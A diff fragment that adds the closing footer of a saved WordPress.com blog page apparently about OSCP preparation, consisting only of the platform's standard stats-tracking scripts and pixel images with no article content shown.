+_stq.push(['extra', {'crypt':'UE5XaGUuOTlwaD85flAmcm1mcmZsaDhkV11YdWFnNncxc1tjZG9XVXhRLWhqanhKV3x0UkRaRXkwYi5reEhjNjk1dllFQlVnMGNnS3lZdS9nUGRlen5EalVTcD0wYk5EaDB2SnYzWVV5Tkw1OVA2Z2R5S25wamRNaVJyeXhlLlNCRkpDLiVQJjVRSUgwd2g0a3osL3gtNklnLz0yK0xWc0NnUyZ4V3E2emp4azFYJUYrS1NsM19ncjJLdjRjYzlnenlqclE1amJ1QUw/QnMxVl85NG9fSnJCZWRHcG80flU/NWN0eGtiZkNvUk1XN0Y='}]);
+_stq.push([ 'clickTrackerInit', '146527631', '4' ]);
+	</script>
+<noscript><img src="https://pixel.wp.com/b.gif?v=noscript" style="height:0px;width:0px;overflow:hidden" alt="" /></noscript>
+<script>
+if ( 'object' === typeof wpcom_mobile_user_agent_info ) {
+
+	wpcom_mobile_user_agent_info.init();
+	var mobileStatsQueryString = "";
+	
+	if( false !== wpcom_mobile_user_agent_info.matchedPlatformName )
+		mobileStatsQueryString += "&x_" + 'mobile_platforms' + '=' + wpcom_mobile_user_agent_info.matchedPlatformName;
+	
+	if( false !== wpcom_mobile_user_agent_info.matchedUserAgentName )
+		mobileStatsQueryString += "&x_" + 'mobile_devices' + '=' + wpcom_mobile_user_agent_info.matchedUserAgentName;
+	
+	if( wpcom_mobile_user_agent_info.isIPad() )
+		mobileStatsQueryString += "&x_" + 'ipad_views' + '=' + 'views';
+
+	if( "" != mobileStatsQueryString ) {
+		new Image().src = document.location.protocol + '//pixel.wp.com/g.gif?v=wpcom-no-pv' + mobileStatsQueryString + '&baba=' + Math.random();
+	}
+	
+}
+</script>
+
+
+<div class="comment-likes-overlay" style="display: none;"></div><img src="./OSCP – My preparation for challenge_files/g.gif" alt=":)" id="wpstats" scale="0"></body></html>
